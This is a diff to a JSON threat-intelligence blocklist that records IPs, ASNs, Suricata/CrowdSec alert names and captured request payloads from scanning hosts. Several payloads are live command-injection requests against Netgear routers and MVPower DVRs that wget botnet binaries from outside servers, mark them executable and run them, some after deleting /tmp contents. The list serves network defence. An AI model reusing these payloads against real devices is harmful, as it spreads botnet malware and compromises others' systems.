@@ -1,89 +1,13 @@
 {
-  "generated_at": "2026-11-05T01:00:00Z",
+  "generated_at": "2026-11-05T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 44,
-    "v4": 44,
+    "total": 51,
+    "v4": 51,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "202.47.53.117",
-      "family": "v4",
-      "first_seen": "2026-10-29T04:00:00Z",
-      "last_seen": "2026-10-29T04:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "9541",
-      "asn_name": "CYBERNET-AP - Cyber Internet Services (Pvt) Ltd.",
-      "asn_prefix": "202.47.53.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://202.47.53.117:45757/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://202.47.53.117:45757/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "197.50.11.7",
-      "family": "v4",
-      "first_seen": "2026-10-29T05:00:00Z",
-      "last_seen": "2026-10-29T05:00:00Z",
-      "scenarios": [
-        "suricata/ET EXPLOIT MVPower DVR Shell UCE"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8452",
-      "asn_name": "TE-AS - IDDQD-AS",
-      "asn_prefix": "197.50.0.0/18",
-      "payloads": [
-        "GET /shell?cd+/tmp;rm+-rf+*;wget+129.212.239.241/jaws;sh+/tmp/jaws"
-      ]
-    },
-    {
-      "ip": "152.32.236.102",
-      "family": "v4",
-      "first_seen": "2026-10-29T03:00:00Z",
-      "last_seen": "2026-10-29T03:00:00Z",
-      "scenarios": [
-        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 5"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "135377",
-      "asn_name": "UCLOUD-HK-AS-AP - UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
-      "asn_prefix": "152.32.236.0/24"
-    },
-    {
-      "ip": "85.217.140.5",
-      "family": "v4",
-      "first_seen": "2026-10-29T05:00:00Z",
-      "last_seen": "2026-10-29T05:00:00Z",
-      "scenarios": [
-        "suricata/ET SCAN Suspicious User-Agent Containing Web Scan/er Likely Web Scanner"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "209334",
-      "asn_name": "MODAT-01 Modat B.V.",
-      "asn_prefix": "85.217.140.0/24",
-      "tags": [
-        "mwl:scanner=\"modat\""
-      ],
-      "payloads": [
-        "GET /"
-      ]
-    },
     {
       "ip": "190.74.113.13",
       "family": "v4",
@@ -801,6 +725,9 @@
       "sources": [
         "suricata"
       ],
+      "asn": "45090",
+      "asn_name": "TENCENT-NET-AP - Shenzhen Tencent Computer Systems Company Limited",
+      "asn_prefix": "43.138.0.0/18",
       "payloads": [
         "GET /gcp.json"
       ]
@@ -825,6 +752,198 @@
       "payloads": [
         "GET /"
       ]
+    },
+    {
+      "ip": "52.180.140.58",
+      "family": "v4",
+      "first_seen": "2026-11-05T10:00:00Z",
+      "last_seen": "2026-11-05T10:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "52.160.0.0/11",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "49.143.129.24",
+      "family": "v4",
+      "first_seen": "2026-11-05T10:00:00Z",
+      "last_seen": "2026-11-05T10:00:00Z",
+      "scenarios": [
+        "suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "38684",
+      "asn_name": "CMBDAEJEON-AS-KR-KR - CMB Daejeon Broadcasting Co,.Ltd",
+      "asn_prefix": "49.143.128.0/22",
+      "payloads": [
+        "GET /shell?cd+/tmp;wget+http://196.251.121.142/a3f8d2/kaizen.arm7sf_srv+-O+.k;chmod+777+.k;./.k"
+      ]
+    },
+    {
+      "ip": "222.159.13.235",
+      "family": "v4",
+      "first_seen": "2026-11-05T09:00:00Z",
+      "last_seen": "2026-11-05T09:00:00Z",
+      "scenarios": [
+        "suricata/ET EXPLOIT MVPower DVR Shell UCE"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "7679",
+      "asn_name": "QTNET - QTnet,Inc.",
+      "asn_prefix": "222.159.0.0/16",
+      "payloads": [
+        "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws"
+      ]
+    },
+    {
+      "ip": "167.172.132.107",
+      "family": "v4",
+      "first_seen": "2026-11-05T07:00:00Z",
+      "last_seen": "2026-11-05T07:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "14061",
+      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
+      "asn_prefix": "167.172.128.0/20"
+    },
+    {
+      "ip": "192.42.116.115",
+      "family": "v4",
+      "first_seen": "2026-11-05T05:00:00Z",
+      "last_seen": "2026-11-05T05:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 50"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "192.42.116.56",
+      "family": "v4",
+      "first_seen": "2026-11-05T05:00:00Z",
+      "last_seen": "2026-11-05T05:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 53"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "215125",
+      "asn_name": "Cyberology-AS Church of Cyberology",
+      "asn_prefix": "192.42.116.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "185.220.101.174",
+      "family": "v4",
+      "first_seen": "2026-11-05T05:00:00Z",
+      "last_seen": "2026-11-05T05:00:00Z",
+      "scenarios": [
+        "suricata/ET TOR Known Tor Exit Node Traffic group 35"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "60729",
+      "asn_name": "TORSERVERS-NET Stiftung Erneuerbare Freiheit",
+      "asn_prefix": "185.220.101.0/24",
+      "tags": [
+        "tor:exit-node"
+      ]
+    },
+    {
+      "ip": "35.210.82.106",
+      "family": "v4",
+      "first_seen": "2026-11-05T03:00:00Z",
+      "last_seen": "2026-11-05T03:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 14"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "35.210.240.68",
+      "family": "v4",
+      "first_seen": "2026-11-05T03:00:00Z",
+      "last_seen": "2026-11-05T03:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 14"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "15169",
+      "asn_name": "GOOGLE - Google LLC",
+      "asn_prefix": "35.210.0.0/16",
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ]
+    },
+    {
+      "ip": "216.36.112.159",
+      "family": "v4",
+      "first_seen": "2026-11-05T01:00:00Z",
+      "last_seen": "2026-11-05T01:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 9"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "3257",
+      "asn_name": "GTT-BACKBONE GTT Communications Inc.",
+      "asn_prefix": "216.36.96.0/19"
+    },
+    {
+      "ip": "102.220.161.173",
+      "family": "v4",
+      "first_seen": "2026-11-05T12:00:00Z",
+      "last_seen": "2026-11-05T12:00:00Z",
+      "scenarios": [
+        "suricata/ET COMPROMISED Known Compromised or Hostile Host Traffic group 1"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "asn": "197769",
+      "asn_name": "VPSDEDICATED-AS VPS Dedicated LLC",
+      "asn_prefix": "102.220.160.0/23"
     }
   ]
 }
